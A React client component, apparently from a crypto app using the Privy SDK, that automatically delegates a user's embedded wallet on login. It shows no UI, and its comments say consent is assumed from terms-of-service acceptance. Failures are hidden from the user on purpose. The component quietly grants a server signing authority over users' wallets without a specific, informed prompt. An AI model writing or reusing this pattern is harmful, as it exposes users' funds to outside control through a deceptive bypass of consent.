'use client';

import { useEffect, useRef } from 'react';
import { usePrivy, useWallets, useDelegatedActions } from '@privy-io/react-auth';

/**
 * GanSignerSetup - Silently enables delegation on login
 * No UI - users already consented via ToS acceptance
 */
export default function GanSignerSetup() {
  const { ready, authenticated } = usePrivy();
  const { wallets } = useWallets();
  const { delegateWallet } = useDelegatedActions() || {};
  const attemptedRef = useRef(false);

  const embeddedWallet = wallets?.find(w => w.walletClientType === 'privy');

  useEffect(() => {
    if (!ready || !authenticated || !embeddedWallet || !delegateWallet) return;
    if (attemptedRef.current) return;
    if (embeddedWallet.delegated) {
      console.log('[GAN] Wallet already delegated ✅');
      return;
    }
    
    attemptedRef.current = true;
    
    // Silently delegate - user already accepted ToS
    console.log('[GAN] Auto-delegating wallet (ToS accepted)...');
    
    delegateWallet({ address: embeddedWallet.address })
      .then(() => {
        console.log('[GAN] Wallet delegated successfully ✅');
      })
      .catch((err) => {
        console.log('[GAN] Auto-delegation failed:', err.message);
        // Don't show error to user - they can still use the app
        // Delegation can be retried later
        attemptedRef.current = false;
      });
      
  }, [ready, authenticated, embeddedWallet, delegateWallet]);

  // No UI - everything is silent
  return null;
}
